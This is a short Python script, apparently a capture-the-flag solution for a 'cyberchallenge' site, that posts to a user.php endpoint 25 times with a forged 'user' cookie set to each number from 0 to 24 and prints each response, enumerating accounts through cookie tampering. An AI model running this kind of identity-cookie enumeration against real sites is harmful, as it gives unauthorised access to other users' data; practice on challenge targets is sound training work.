
import json
import requests


s=requests.Session()
for i in range (25):
    response = s.post('https://cloud.rabitti.org/cyberchallenge/user.php', cookies={'user':f'{i}'})
    print(response.text)

